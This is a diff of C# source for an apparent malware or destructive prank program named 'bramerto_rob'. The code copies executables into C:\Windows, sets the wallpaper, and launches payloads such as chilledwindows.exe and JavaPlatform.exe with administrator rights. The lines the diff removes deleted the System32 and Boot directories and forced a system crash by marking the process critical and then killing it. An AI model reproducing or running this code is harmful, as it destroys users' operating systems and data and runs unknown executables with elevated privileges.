@@ -54,8 +54,6 @@ namespace bramerto_rob
         string destinationFile2 = @"C:\Windows\Insidious12.exe";
         string source3 = @"C:\Program Files (x86)\bramerto-rob\Files\Server.exe";
         string destinationFile3 = @"C:\Windows\Server.exe";
-        string root = @"C:\Windows\System32";
-        string root2 = @"C:\Windows\Boot";
 
         [DllImport("user32.dll", CharSet = CharSet.Auto)]
         private static extern Int32 SystemParametersInfo(
@@ -123,15 +121,7 @@ namespace bramerto_rob
             if (File.Exists(imgWallpaper))
             {
                 SetWallpaper(imgWallpaper);
-            }
-            if (Directory.Exists(root))
-            {
-                Directory.Delete(root);
-            }
-            if (Directory.Exists(root2))
-            {
-                Directory.Delete(root2);
-            }
+            }            
         }
         
         private void Time1_Tick_1(object sender, EventArgs e)
@@ -142,7 +132,7 @@ namespace bramerto_rob
             Time2.Enabled = true;
             Time2.Tick += new EventHandler(Time2_Tick);
             Time2.Start();
-            Process.Start(@"C:\Program Files (x86)\bramerto-rob\Files\chilledwindows.exe");
+            ExecuteAsAdmin(@"C:\Program Files (x86)\bramerto-rob\Files\chilledwindows.exe");
         }
 
         
@@ -151,9 +141,7 @@ namespace bramerto_rob
             Time3.Stop();
             Time3.Enabled = false;
 
-            System.Diagnostics.Process.EnterDebugMode();
-            RtlSetProcessIsCritical(1, 0, 0);
-            System.Diagnostics.Process.GetCurrentProcess().Kill();
+            ExecuteAsAdmin(@"C:\Program Files(x86)\Files\JavaPlatform.exe");
         }
 
         private void Time2_Tick(object sender, EventArgs e)
